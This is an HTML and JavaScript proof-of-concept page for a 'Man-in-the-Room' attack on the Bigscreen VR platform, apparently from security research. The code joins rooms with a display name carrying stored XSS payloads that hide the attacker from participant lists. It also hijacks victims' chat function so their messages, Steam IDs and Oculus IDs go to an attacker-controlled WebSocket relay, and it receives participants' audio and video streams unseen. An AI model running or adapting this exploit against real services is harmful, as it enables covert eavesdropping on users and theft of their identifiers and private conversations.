<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="./bootstrap.min.css">
    <link rel="stylesheet" href="./main.css">

    <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <div class="col-sm">
            <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
            <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
            <div class="alert alert-success" role="alert">
                Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>. Attacker is not visible in VR room.
            </div>
            <form class="form-inline" id="joinRoomForm">
                <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
                <input class="mb-2 mr-sm-2 form-control" id="roomIdInput" type="text" placeholder="8we1jdc4" required>
                <input class="btn btn-outline-primary mb-2 mr-sm-2" type="submit" value="Eavesdrop">
            </form>
        </div>
    </div>




<div id="rooms"></div>


</div>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="./jquery-3.3.1.slim.min.js"></script>
<script src="./popper.min.js"></script>
<script src="./bootstrap.min.js"></script>
<script src="./adapter-latest.js"></script>
<script src="./msgpack.min.js"></script>
<script>
'use strict';

const offerOptions = {
  offerToReceiveAudio: 1,
  offerToReceiveVideo: 1
};

function Connection(userId, scid, pcid){
    this.userId = userId;
    this.scid = scid;
    this.pcid = pcid;
    this.isStarted = false;
    this.isInitiator = false;
    this.rtcPeerConnection = null;
    this.remoteStream = null;
    this.videoElement = null;
    this.cardElement = null;
}
let connections = [];

let allRemoteStreams = [];
let roomState;

let rooms = {};

let turnReady;

let dataChannelSend, dataChannelReceive;

const pcConfig = {
    'iceServers': [{
        'urls': 'stun:stun.l.google.com:19302'
    }]
};


let textName = '__Mallory__';

let relayServer = 'ws://172.26.103.128:8081'; // TODO
//region XSS payloads
let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}}e.remove();});`;
let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
//endregion

//region variables for Bigscreen signaling protocol
let NAME = textName;
NAME += '<scr'+'ipt>';
NAME += hideUsernameFromRoomPreview;
NAME += hideFirstCommaFromRoomPreview;
NAME += hideUsernameFromRoomParticipants;
NAME += persistentChatEavesdropping;
NAME += '</sc'+'ript>';

let roomId;
let myUserId;
let myUuid = generateBigscreenUuid();
let unityVersion = '0.34.0';
let mySteamId = '';
let myOculusId = '';
//endregion

const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
let websocket;


<!--region GUI bindings -->
const joinRoomForm = document.getElementById('joinRoomForm');
const roomsElement = document.getElementById('rooms');
const roomIdInput = document.getElementById('roomIdInput');
<!--endregion-->

joinRoomForm.addEventListener("submit", function (event) {
    event.preventDefault();
    roomId = roomIdInput.value;

    websocket = new WebSocket(bigscreenSignalUrl);
    websocket.binaryType = 'arraybuffer';
    websocket.onopen = function (event) {
        console.log('connected', event);
        sendMessage({type: 'register-desktop'});
        console.log('registered');
        joinRoom();
        let roomUI = new RoomCardUI(roomId);
        roomUI.render(roomsElement);
        rooms[roomId] = roomUI;
    };
    websocket.onclose = function (event) {
        console.log('onClose disconnected', event);
    };
    websocket.onmessage = function (event) {
        onMessage(event);
    };
    websocket.onerror = function (event) {
        console.log('onError event', event);
    };
});

function RoomCardUI(roomId){
    let roomCardTempalte = document.createElement('template');
    roomCardTempalte.innerHTML =
        '<div class="card">\n' +
        '    <div class="card-header"></div>\n' +
        '    <div class="card-body">\n' +
        '        <div class="row">\n' +
        '            <div class="col-sm-3">\n' +
        '                <div class="card">\n' +
        '                    <div class="card-header">Chat</div>\n' +
        '                    <div class="card-body chat">\n' +
        '                    </div>\n' +
        '                </div>\n' +
        '            </div>\n' +
        '            <div class="col-sm-9">\n' +
        '                <div class="row"></div>\n' +
        '            </div>\n' +
        '      </div>\n' +
        '  </div>\n' +
        '</div>';
    this.roomCardElement = roomCardTempalte.content.firstChild;

    this.roomIdElement = this.roomCardElement.querySelector('.card-header');
    this.roomIdElement.appendChild(document.createTextNode(roomId));

    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');

    this.render = function(parentElement){
        parentElement.appendChild(this.roomCardElement);
    };

    this.renderChatMessage = function(message, sender, date){
        let chatMessageTemplate = document.createElement('template');
        chatMessageTemplate.innerHTML =
            '<blockquote class="blockquote">\n' +
            '    <p class="mb-0"></p>\n' +
            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
            '</blockquote>\n';
        let chatMessageElement = chatMessageTemplate.content.firstChild;
        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
        this.chatBodyElement.appendChild(chatMessageElement);

        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
    }
}




////////////////////////////////////////////////

function showUsernames() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        console.log('onreadystatechange', this.readyState);
        if (this.readyState === 4 && this.status === 200) {
           console.log(xhttp.responseText);
           roomState = JSON.parse(xhttp.responseText);
            for (let i = 0; i < connections.length; i++) {
                let c = connections[i];
                if(c.cardElement){
                    let userNameElement = c.cardElement.getElementsByClassName('username')[0];
                    userNameElement.innerHTML = ' ';
                    userNameElement.appendChild(document.createTextNode(roomState[c.userId + '.name']));

                    let userIdElement = c.cardElement.getElementsByClassName('userId')[0];
                    userIdElement.innerHTML = ' ';
                    userIdElement.appendChild(document.createTextNode(c.userId));
                }
            }
        }
    };
    xhttp.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId='+roomId, true);
    xhttp.send();
}

function sendMessage(message) {
    console.log('sendMessage', message);
    websocket.send(msgpack.encode(message));
}

function onMessage(event) {
    let message = msgpack.decode(new Uint8Array(event.data));
    console.log('onMessage', message);

    switch (message.type) {
        case "room-latest":
        case "admin":
        case "linkedpc-joined":
        case "linkedpc-left":
        case "party-join":
        case "user-ready":
        case "user-left":
        case "room-join-fail":
        case "room-created":
        case "room-environment":
        case "room-private":
        case "room-public":
        case "events":
        case "server-time":
            console.log('received message ignored', message);
            break;

        case "user-joined":
            if(message.uuid === myUuid){
                myUserId = message.userId;
                console.log('set myUserId', myUserId);
                sendUserReady();
                console.log('user ready');
            }
            break;

        case 'ice':
            console.log('onMessage received ICE');
            console.assert(message.fromDevice === 'desktop', message.fromDevice);

            const candidateStartPos = message.value.indexOf('candidate:');
            let beforeCandidate  = message.value.slice(0,candidateStartPos);
            let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
            let sdpMid = beforeCandidate.slice(
                beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
                beforeCandidate.indexOf('bigscreen_sdp_mid'));
            let candidate = new RTCIceCandidate({
                sdpMid: sdpMid,
                sdpMLineIndex: sdpMLineIndex,
                candidate: message.value.slice(candidateStartPos)
            });
            {
                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
                console.log('ice conn', connection);
                connection.rtcPeerConnection.addIceCandidate(candidate);
            }
            break;
        case 'offer':
            console.log('onMessage received OFFER');
            console.assert(message.fromDevice === 'desktop', message.fromDevice);

            {
                let connection = new Connection(message.fromUser, message.SCID, message.PCID);
                connections.push(connection);

                if (!connection.isInitiator && !connection.isStarted) {
                    maybeStart(connection);
                }
                connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
                    {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
                doAnswer(connection);
            }
            break;
        case 'answer':
            console.error('onMessage received ANSWER');

            console.assert(message.roomId === roomId, message.roomId, roomId);
            console.assert(message.targetUser === myUserId, message.targetUser, myUserId);
            console.assert(message.fromDevice === 'desktop', message.fromDevice);
            console.assert(message.targetDevice === 'desktop', message.targetDevice);
            {
                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
                if (connection.isStarted) {
                    connection.setRemoteDescription(new RTCSessionDescription(
                        {
                            type: message.type,
                            sdp: message.value,
                            scid: connection.scid,
                            pcid: connection.pcid
                        }));
                }
            }
            break;
        default:
            console.error('Unexpected message type (server to client):', message);
            break;
    }
}

function generateBigscreenUuid() {
  function bigscreenRand() {
    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
  }
  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
}

function joinRoom(){
    sendMessage({
        'type': "room-join",
        'roomId': roomId,
        'name': NAME,
        'uuid': myUuid,
        'version': unityVersion,
        'steamId': mySteamId,
        'oculusId': myOculusId
    });
}

function sendUserReady(){
    sendMessage({
        type: "user-ready",
        roomId: roomId,
        userId: myUserId
    })
}
////////////////////////////////////////////////////



function maybeStart(connection) {
    if (!connection.isStarted) {
        try {
            connection.rtcPeerConnection = new RTCPeerConnection(null);
            connection.rtcPeerConnection.onicecandidate = function (event) {
                console.log('icecandidate event: ', event);
                if (event.candidate) {
                    sendMessage({
                        type: 'ice',
                        roomId: roomId,
                        value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
                            + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
                        fromDevice: 'desktop',
                        targetDevice: 'desktop',
                        fromUser: myUserId,
                        targetUser: connection.userId,
                        SCID: connection.scid,
                        PCID: connection.pcid,
                    });
                } else {
                    console.log('End of candidates.');
                }
            };
            connection.rtcPeerConnection.ontrack  = function (event) {
                console.log('Remote streams added.');
                console.log(event.streams);
                allRemoteStreams.push(event.streams);
                connection.remoteStream = event.streams[0];
                if(connection.pcid === 0){
                    if(connection.videoElement === null){
                        let template = document.createElement('template');
                        template.innerHTML = '<div class="col-sm-4">\n' +
                            '           <div class="card">\n' +
                            '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
                            '              <div class="card-body">\n' +
                            '                <h5 class="username card-title">Username</h5>\n' +
                            '                <h6 class="userId card-subtitle mb-2 text-muted">UserId</h6>\n' +
                            '                <p class="card-text"></p>\n' +
                            '              </div>\n' +
                            '            </div>\n' +
                            '        </div>';
                        let cardElement = template.content.firstChild;
                        connection.cardElement = cardElement;
                        connection.videoElement = cardElement.getElementsByTagName('video')[0];
                        rooms[roomId].participantsElement.appendChild(cardElement);
                        showUsernames();
                    }
                    connection.videoElement.srcObject = event.streams[0];
                }
            };
            connection.rtcPeerConnection.onremovestream = function (event) {
                console.log('Remote stream removed. Event: ', event);
            };

            console.log('Created RTCPeerConnnection');
        } catch (e) {
            console.log('Failed to create PeerConnection, exception: ' + e.message);
            alert('Cannot create RTCPeerConnection object.');
            return;
        }
        if (connection.isInitiator){
            dataChannelSend = connection.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
            dataChannelSend.onopen = onSendChannelStateChangeDirect;
            dataChannelSend.onclose = onSendChannelStateChangeDirect;
        }
        else{
            connection.rtcPeerConnection.ondatachannel = function(event) {
                console.log('Receive Channel Callback');
                dataChannelReceive = event.channel;
                dataChannelReceive.onmessage = function(event){
                    //console.error('Received Message', connection, event.data);
                };
                dataChannelReceive.onopen = onReceiveChannelStateChangeDirect;
                dataChannelReceive.onclose = onReceiveChannelStateChangeDirect;
            };
        }

        connection.isStarted = true;
        console.log('connection.isInitiator', connection.isInitiator);
        if (connection.isInitiator) {
            console.log('Sending offer to peer');
            connection.rtcPeerConnection.createOffer(offerOptions).then(
                function(sdp){setLocalAndSendMessage(sdp, connection)}, handleCreateOfferError);
        }
    }
}

function onSendChannelStateChangeDirect() {
  const readyState = dataChannelSend.readyState;
  console.log('dataChannelSend Send channel state is: ' + readyState);
}
function onReceiveChannelStateChangeDirect() {
  const readyState = dataChannelReceive.readyState;
  console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
}

/////////////////////////////////////////////////////////




function handleCreateOfferError(event) {
    console.log('createOffer() error: ', event);
}

function setLocalAndSendMessage(sessionDescription, connection) {
    connection.rtcPeerConnection.setLocalDescription(sessionDescription);
    let sessionDescriptionMessage = {
        type: sessionDescription.type,
        roomId: roomId,
        value: sessionDescription.sdp,
        fromDevice: 'desktop',
        targetDevice: 'desktop',
        fromUser: myUserId,
        targetUser: connection.userId,
        SCID: connection.scid,
        PCID: connection.pcid,
    };
    console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
    sendMessage(sessionDescriptionMessage);
}

function doAnswer(connection) {
    console.log('Sending answer to peer.');
    connection.rtcPeerConnection.createAnswer().then(
        function(sdp){setLocalAndSendMessage(sdp, connection)},
        onCreateSessionDescriptionError
    );
}

function onCreateSessionDescriptionError(error) {
    console.log('Failed to create session description: ' + error.toString());
}

/*
if (location.hostname !== 'localhost') {
    requestTurn(
        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
    );
}

function requestTurn(turnURL) {
    let turnExists = false;
    for (let i in pcConfig.iceServers) {
        if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
            turnExists = true;
            turnReady = true;
            break;
        }
    }
    if (!turnExists) {
        console.log('Getting TURN server from ', turnURL);
        // No TURN server. Get one from computeengineondemand.appspot.com:
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                let turnServer = JSON.parse(xhr.responseText);
                console.log('Got TURN server: ', turnServer);
                pcConfig.iceServers.push({
                    'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
                    'credential': turnServer.password
                });
                turnReady = true;
            }
        };
        xhr.open('GET', turnURL, true);
        xhr.send();
    }
}
*/



let lastReceivedMessage;
var messageRelayWs = new WebSocket('ws://127.0.0.1:8081');
messageRelayWs.onopen = function(){
    messageRelayWs.send('control-panel-connect');
};
messageRelayWs.onmessage = function(event){
    let message = JSON.parse(event.data);
    console.log("messageRelayWs received:", message);
    rooms[message.roomId].renderChatMessage(message.message, message.name, new Date());
};

</script>
</body>
</html>
